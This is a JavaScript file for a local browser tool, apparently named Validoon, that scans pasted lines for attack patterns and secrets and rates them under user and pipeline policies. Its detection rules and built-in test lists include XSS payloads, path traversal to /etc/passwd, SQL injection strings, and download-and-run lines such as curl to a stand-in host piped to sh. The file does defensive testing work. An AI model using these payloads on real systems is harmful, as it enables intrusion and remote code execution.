// app.js
(() => {
  "use strict";

  const BUILD = "v2026-01-05_normalization_v3_policy_secrets_freeze";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  // ----------------------------
  // Normalization (v3)
  // ----------------------------
  function tryDecodeURIComponentSafe(s) {
    try { return decodeURIComponent(s); } catch { return s; }
  }

  // Decode multiple times to handle double-encoding like ..%252f..%252f
  function decodeMulti(s, rounds = 3) {
    let out = s;
    for (let i = 0; i < rounds; i++) {
      const next = tryDecodeURIComponentSafe(out);
      if (next === out) break;
      out = next;
    }
    return out;
  }

  function normalizeLine(raw) {
    let s = (raw ?? "").toString();

    // Trim + normalize whitespace
    s = s.replace(/\r/g, "").trim().replace(/\s+/g, " ");

    // Decode percent-encoding multiple times
    s = decodeMulti(s, 3);

    // Normalize backslashes to slashes for path detection (but keep original decision context)
    // This helps detect Windows paths even if mixed.
    const s2 = s.replace(/\\+/g, "\\"); // compress
    const s3 = s2.replace(/\\+/g, "\\"); // stable

    return s3;
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(s => normalizeLine(s))
      .filter(Boolean);
  }

  // ----------------------------
  // Utilities
  // ----------------------------
  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  function classifyType(s) {
    const x = (s || "").trim();
    if (!x) return "Data";

    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);

    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);

    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // ----------------------------
  // Rules (Detection)
  // ----------------------------
  const RULES = [
    // Redirect/open-redirect
    {
      label: "REDIRECT_PARAM",
      test: s => /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) || /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
      sev: 55, conf: 90
    },
    {
      label: "AUTH_ENDPOINT",
      test: s => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
      sev: 45, conf: 80
    },

    // Obfuscation / encoding
    {
      label: "BASE64_DECODE",
      test: s => /(data:text\/html;base64,)/i.test(s),
      sev: 35, conf: 70
    },
    {
      label: "OBFUSCATION",
      test: s =>
        /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i.test(s) ||
        /[A-Za-z0-9+\/]{40,}={0,2}/.test(s),
      sev: 35, conf: 67
    },
    {
      label: "HOMOGRAPH_RISK",
      test: s => /\bxn--/i.test(s),
      sev: 60, conf: 70
    },

    // XSS / JS
    {
      label: "XSS/JS_SCRIPT",
      test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
      sev: 85, conf: 85
    },

    // LFI paths (post-normalization catches decoded forms)
    {
      label: "LFI:ETC_PASSWD",
      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts|C:\\Windows\\System32\\drivers\\etc\\hosts/i.test(s),
      sev: 80, conf: 75
    },

    // Command chaining
    {
      label: "CMD:CMD_CHAIN",
      test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s),
      sev: 85, conf: 85
    },
    {
      label: "DOWNLOAD_TOOL",
      test: s => /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
      sev: 90, conf: 90
    },

    // SQLi
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: s => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
      sev: 75, conf: 85
    },
    {
      label: "SQL:SQLI_UNION_ALL",
      test: s => /union\s+select/i.test(s),
      sev: 80, conf: 80
    },

    // ----------------------------
    // Secrets (NEW)
    // ----------------------------
    {
      label: "SECRET:BEARER_TOKEN",
      test: s => /\bAuthorization:\s*Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\b/i.test(s) || /\bBearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\b/i.test(s),
      sev: 65, conf: 85
    },
    {
      label: "SECRET:AWS_ACCESS_KEY",
      test: s => /\bAKIA[0-9A-Z]{16}\b/.test(s),
      sev: 70, conf: 90
    },
    {
      label: "SECRET:PRIVATE_KEY_BLOCK",
      test: s => /-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----/i.test(s) || /-----END (RSA |EC |OPENSSH )?PRIVATE KEY-----/i.test(s),
      sev: 75, conf: 95
    }
  ];

  function detectHits(input) {
    const s = (input || "").trim();
    const hits = [];
    for (const r of RULES) {
      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }
    return hits;
  }

  // ----------------------------
  // Policy Layer (NEW)
  // ----------------------------
  // Detection stays the same; only decision thresholds change per policy.
  const POLICIES = {
    USER: {
      name: "USER",
      // Block only when truly high-risk (XSS, download+cmd, explicit JS schemes)
      blockSev: 85,
      warnSev: 55,
      // Secrets default to WARN (not BLOCK) in USER mode
      secretsForceWarn: true
    },
    PIPELINE: {
      name: "PIPELINE",
      // Stricter: block on high-risk + sensitive secrets if desired
      blockSev: 80,
      warnSev: 55,
      secretsForceWarn: false // allow secrets to reach BLOCK by severity
    }
  };

  function isSecretLabel(label) {
    return label.startsWith("SECRET:");
  }

  function decideFromHits(hits, policy) {
    let severity = 0, confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map(h => h.sev));
      confidence = Math.max(...hits.map(h => h.conf));
    }

    // Base decision
    let decision = "ALLOW";

    // If secretsForceWarn, clamp secret-only cases to WARN
    const hasOnlySecrets = hits.length > 0 && hits.every(h => isSecretLabel(h.label));
    const hasAnySecret = hits.some(h => isSecretLabel(h.label));

    // Hard blocks for explicit dangerous behaviors regardless of policy
    const hardBlock = hits.some(h => h.label === "DOWNLOAD_TOOL") || hits.some(h => h.label === "XSS/JS_SCRIPT");

    if (hardBlock || hits.some(h => h.sev >= policy.blockSev)) decision = "BLOCK";
    else if (hits.some(h => h.sev >= policy.warnSev)) decision = "WARN";

    if (policy.secretsForceWarn && (hasOnlySecrets || (hasAnySecret && decision === "BLOCK" && !hardBlock))) {
      decision = "WARN";
    }

    return { decision, severity, confidence };
  }

  function analyzeOne(input, policy) {
    const s = (input || "").trim();
    const hits = detectHits(s);

    const { decision, severity, confidence } = decideFromHits(hits, policy);
    const type = classifyType(s);
    const entropy = shannonEntropy(s);

    return { input: s, type, decision, severity, confidence, entropy, hits };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) {
      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
    }
    const signals = [...sigMap.entries()]
      .sort((a,b) => b[1]-a[1])
      .map(([label,count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows, policyName) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      build: BUILD,
      policy: policyName,
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows
    };
  }

  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    const box = $("verdictBox");
    if (!verdictText || !box) return;

    verdictText.textContent = meta.verdict;

    box.style.borderColor =
      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
      "rgba(45,212,191,.25)";

    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;

    $("kScans").textContent = String(meta.counts.scans);
    $("kAllow").textContent = String(meta.counts.allow);
    $("kWarn").textContent = String(meta.counts.warn);
    $("kBlock").textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      for (const s of meta.signals) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = `${s.label} ×${s.count}`;
        sigWrap.appendChild(d);
      }
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
      }
    }
  }

  function renderRows(rows) {
    const host = $("rows");
    if (!host) return;
    host.innerHTML = "";

    for (const r of rows) {
      const tr = document.createElement("div");
      tr.className = "trow";

      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");

      const c1 = document.createElement("div");
      c1.className = "mono";
      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;

      const c2 = document.createElement("div");
      c2.textContent = r.type;

      const c3 = document.createElement("div");
      c3.className = "tag";
      const dot = document.createElement("span");
      dot.className = `dot ${dotClass}`;
      const t = document.createElement("span");
      t.textContent = r.decision;
      c3.append(dot, t);

      const c4 = document.createElement("div");
      c4.textContent = `${r.severity}%`;

      const c5 = document.createElement("div");
      c5.textContent = `${r.confidence}%`;

      const c6 = document.createElement("div");
      c6.textContent = String(r.entropy);

      tr.append(c1,c2,c3,c4,c5,c6);
      host.appendChild(tr);
    }
  }

  // ----------------------------
  // Tests (keep as-is, normalization will improve results)
  // ----------------------------
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
    "http://xn--pple-43d.com/login",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify",
    "https://good.com/redirect?url=https://evil.com",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "redirect_uri=https://evil.com",
    "returnUrl=//evil.com",
    "next=//evil.com",
    "url=javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls -la",
    "| whoami",
    "&& curl http://evl1.tld/payload.sh | sh",
    "powershell -enc SQBFAFgA",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "' OR '1'='1",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "Authorization: Bearer abc.def.ghi",
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
  ];

  const TEST_B = [
    "hello world",
    "https://example.com/",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "returnUrl=//evil.com",
    "url=javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "&& curl http://evl1.tld/payload.sh | sh",
    "UNION SELECT username,password FROM users",
    "powershell -enc SQBFAFgA"
  ];

  let lastReport = null;

  function getPolicy() {
    const sel = $("policyMode");
    const v = sel ? sel.value : "USER";
    return POLICIES[v] || POLICIES.USER;
  }

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const policy = getPolicy();
    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(x => analyzeOne(x, policy));
    const report = buildReport(rows, policy.name);

    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  function openInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.close === "function") dlg.close();
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
    safeOn($("btnScan"), "click", runScanFromTextarea);
    safeOn($("btnExport"), "click", exportJSON);
    safeOn($("btnClear"), "click", clearAll);
    safeOn($("btnInfo"), "click", openInfo);
    safeOn($("btnCloseInfo"), "click", closeInfo);

    // Re-scan if policy changes
    safeOn($("policyMode"), "change", runScanFromTextarea);

    console.log(`[Validoon] ${BUILD} loaded. Policy=${getPolicy().name}. Local-only. No network.`);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
